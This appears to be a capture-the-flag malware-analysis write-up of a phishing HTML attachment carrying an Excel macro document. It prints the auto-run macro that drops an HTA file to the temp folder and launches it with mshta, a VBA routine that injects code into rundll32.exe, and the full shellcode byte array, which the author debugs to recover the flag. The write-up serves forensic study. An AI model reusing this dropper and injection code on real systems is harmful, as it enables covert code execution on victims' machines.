> This document came in as an email attachment. Our SOC tells us that they think
> there were some errors in it that caused it not to execute correctly. Can you
> figure out what the command and control mechanism would have been had it worked?

> Author: **[0xdf][author-profile]**

## Meta

Windows Defender, Ad-Aware and a few others flag the file as a "generic trojan".

`trid`, `file`, `exiftool` return nothing.

## Unpacking

The html file is a wrapper for a base64 encoded xls document, located inside a malicious anchor tag.

It can be extracted with:

```bash
cat invoice-42369643.html |
  perl -ne 'm#base64,([a-zA-Z0-9/=+]+)\"#g && print $1' |
  base64 -d > invoice-42369643.xlsm
```

Next, we extract the macros from the resulting office document:

```bash
olevba2 --deobf --decode --reveal invoice-42369643.xlsm > macros.dump
```

**Note**: I had encoding issues with Sublime Text. When copy / pasting, sections would
disappear. The output from olevba was encoded as "Western (Windows 1252)", but it
should be changed to UTF-8.

> Set the macros encoding to `UTF-8`

```
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA obfuscated      |VBA string expressions were detected, may be |
|          |Strings             |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |LwTHLrGh.hta        |Executable file name                         |
|Hex String|'\x00\x02\x08\x19'  |00020819                                     |
|Hex String|'\x00\x00\x00\x00\x0|000000000046                                 |
|          |0F'                 |                                             |
|Hex String|'\x00\x02\x08 '     |00020820                                     |
|Hex String|'\x16QPr'           |16515072                                     |
|Hex String|'\x16q\x16\x80'     |16711680                                     |
|Hex String|'\xbf\xf2p\xcf'     |BFF270CF                                     |
|Hex String|'O\x12\x00vN\xde'   |4F1200764EDE                                 |
|Hex String|'\x0c\x82*\xf2'     |0C822AF2                                     |
|Hex String|'\xff\x97\x1f\x81<r'|FF971F813C72                                 |
|Base64    |'$\xbak\xae\x91k'   |JLprrpFr                                     |
|String    |                    |                                             |
|Base64    |'Q\x97\\Q\x07\x89'  |UZdcUQeJ                                     |
|String    |                    |                                             |
|VBA string|'\x00'              |Chr(0)                                       |
|VBA string|'$\xbak\xae\x91k'   |Goto ("JLprrpFr")                            |
|VBA string|%temp%\LwTHLrGh.hta |Environ("temp") & "\LwTHLrGh.hta"            |
|VBA string|mshta               |"msh" & "ta "                                |
+----------+--------------------+---------------------------------------------+
```

At this point there are several tactics:

- rework the VBA and understand its logic?
- find out the IO and trace the calls in Excel / LibreOffice?
- rewrite the scripts in another language and run it?

I'll start with reading the VBA macro to understand the overall logic, and then
reproduce the functionality.

## The macro's logic

The `Auto_Open` function is at the root of the process:

```shell
Sub Auto_Open()
    Dim fHdswUyK, GgyYKuJh
    Application.Goto ("JLprrpFr")
    GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"
    
    Open GgyYKuJh For Output As #1
    Write #1, hdYJNJmt(ActiveSheet.Shapes(2).AlternativeText & UZdcUQeJ.yTJtzjKX & Selection)
    Close #1
    
    fHdswUyK = "msh" & "ta " & GgyYKuJh
    x = Shell(fHdswUyK, 1)
End Sub
```

It performs the following operations:

- select the cell "JLprrpFr", located in K2: `Application.Goto ("JLprrpFr")`
- select the output path, in the temp directory: `GgyYKuJh = Environ("temp") & "\LwTHLrGh.hta"`
- concatenate 3 strings:
  - `ActiveSheet.Shapes(2).AlternativeText`, the description / alt text of
    the Excel logo in the worksheet 
  - `UZdcUQeJ.yTJtzjKX` is a glocal string variable
  - the content of the selected cell, "JLprrpFr"
- `hdYJNJmt` somehow transforms the whole string into a meaningful format
- its output is then written to the `.hta` file
- execute the file

The dead cell is slightly visible thanks to an arrow, in the spreadsheet.

So, the actual payload is:

- split in 3 parts scattered around the document
- encoded with an unknown scheme
- executed with the command `mshta`

## Piecing the payload together

Rather than executing the payload, let's decode it.

Excel macros don't run perfectly in LibreOffice: for example, I had to manually
search for the `ActiveSheet.Shapes(2).AlternativeText`, because it's a
description in LibreOffice.

I had already found the 2 other parts
So I extracted & concatenated the obfuscated payload parts beforehand.

```shell
output_file_path = "/root/workspace/ctf/hackthebox/forensics/obfsc4t10n/payload.hta"
p1 = "PGh0bWw+PGhlYWQ+PHNjcmlwdCBsYW5ndWFnZT0idmJzY3JpcHQiPgpEaW0gb2JqRXhjZWwsIF..."
p2 = "lvbk5hbWUgIiYiQXMgU3RyaW4iJiJnIiZDaHIoNDQpJiIgQnlWYWwgbCImInBDb21tYW5kIiYi..."
p3 = "ciJkNocig0NCkmQ2hyKDQ1KSYiNzkiJiBfIApDaHIoNDQpJiIxMTYiJkNocig0NCkmIjk0IiZD..."

Open output_file_path For Output As #1
Write #1, deobfuscate(p1 & p2 & p3)
Close #1

payload = "mshta " & output_file_path
'x = Shell(payload, 1)
```

It results in an "hta" file: MS HTML application, which is actually plain VBScript.

```shell
Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule

Set objExcel = CreateObject("Excel.Application")
objExcel.Visible = False

Set WshShell = CreateObject("Wscript.Shell")

function RegExists(regKey)
        on error resume next
        WshShell.RegRead regKey
        RegExists = (Err.number = 0)
end function
...
```

## Defragmentating the nested payload

The former macro payload encapsulates yet another obfuscated payload!

The logic of the new script is:

- first disable the "Trust access for VBA" in Excel
- create *another* Excel workbook
- inject some payload
- disable the alerts
- run the injected code
- close Excel while keeping the workbook running
- restore the Windows registry

And the new payload is another weird string:

```
"Private "&"Type PRO"&"CESS_INF"&"ORMATION"&Chr(10)&"    hPro"&"cess As "&"Long"&Chr(10)&"    hThr"&"ead As L"&"ong"&Chr(10)...
```

It's just a fragmented string with characters expressed as ASCII numbers.

The syntax is very close to a Python string, with a few adjustements we get
the full picture.

It is a VBA script which performs a PE injection on "rundll32.exe":

```shell
If Len(Environ("ProgramW6432")) > 0 Then
        sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
    Else
        sProc = Environ("windir") & "\\System32\\rundll32.exe"
    End If

    res = RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)

    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)
    For offset = LBound(myArray) To UBound(myArray)
        myByte = myArray(offset)
        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&)
    Next offset
    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)
```

## Debugging the shellcode

"rundll32.exe" is meant to execute the following shellcode:

```vba
myArray = Array(-35,-63,-65,32,86,66,126,-39,116,36,-12,91,49,-55,-79,98,49,123,24,3,123,24,-125,-61,36,-76,-73,-126,-52,-70,56,123,12,-37,-79,-98,61,-37,-90,-21,109,-21,-83,-66,-127,-128,-32,42,18,-28,44,92,-109,67,11,83,36,-1,111,-14,-90,2,-68,-44,-105,-52,-79,21,-48,49,59,71,-119,62,-18,120,-66,11,51,-14,-116,-102,51,-25,68,-100,18,-74,-33,-57,-76,56,12,124,-3,34,81,-71,-73,-39,-95,53,70,8,-8,-74,-27,117,53,69,-9,-78,-15,-74,-126,-54,2,74,-107,8,121,-112,16,-117,-39,83,-126,119,-40,-80,85,-13,-42,125,17,91,-6,-128,-10,-41,6,8,-7,55,-113,74,-34,-109,-44,9,127,-123,-80,-4,-128,-43,27,-96,36,-99,-79,-75,84,-4,-35,122,85,-1,29,21,-18,-116,47,-70,68,27,3,51,67,-36,100,110,51,114,-101,-111,68,90,95,-59,20,-12,118,102,-1,4,119,-77,80,85,-41,108,17,5,-105,-36,-7,79,24,2,25,112,-13,43,50,-88,-5,83,-61,-46,-115,58,-81,49,21,-46,66,43,-68,66,-77,-59,81,-76,-125,77,-17,-79,116,94,-80,2,72,-22,17,-7,-58,33,-14,113,127,119,127,26,76,37,2,-38,-38,96,-44,-18,-102,-116,-15,-124,-37,110,-109,-112,-117,-26,97,-91,42,76,-20,67,70,-94,-72,-36,-1,91,-31,-105,-98,-92,60,-46,-95,47,-76,34,111,-40,-67,48,-104,-65,61,-55,89,42,61,-93,93,-4,106,91,92,-39,92,-60,-97,12,-33,3,95,-47,-23,120,86,71,85,23,-105,-121,85,-25,-63,-51,85,-113,-75,-75,6,-86,-71,99,59,103,44,-116,109,-37,-25,-28,-109,2,-49,-86,108,97,83,-84,-110,-9,124,21,-6,7,61,-91,-6,109,-67,-11,-110,122,-110,-6,82,-126,57,83,-6,9,-84,17,-101,14,-27,-12,5,14,10,45,-74,117,95,-46,55,-118,-119,-73,56,-118,-75,-55,5,92,-116,-65,72,92,-85,-80,-1,-63,-102,90,-1,86,-36,78)
```

This array can be converted to unsigned bytes with:

```python
with open('payload.bin', 'wb') as _f:
    _f.write(bytes([_b & 0xff for _b in BYTES]))
```

The shellcode itself would be very tiresome to analyse statically. 

Instead, `blobrunner` can inject shellcode in itself! Now we can debug
blobrunner while it triggers the shellcode:

![][debugging-shellcode-screenshot]

The code contains a loop (see EIP above) modifying the rest of the payload!

The resulting bytes make no sense when interpreted as assembly, it's plain ASCII:

> `HTB{g0_G3t_th3_ph1sh3R}`

[author-profile]: https://app.hackthebox.com/users/4935
[debugging-shellcode-screenshot]: images/debugging-shellcode.png
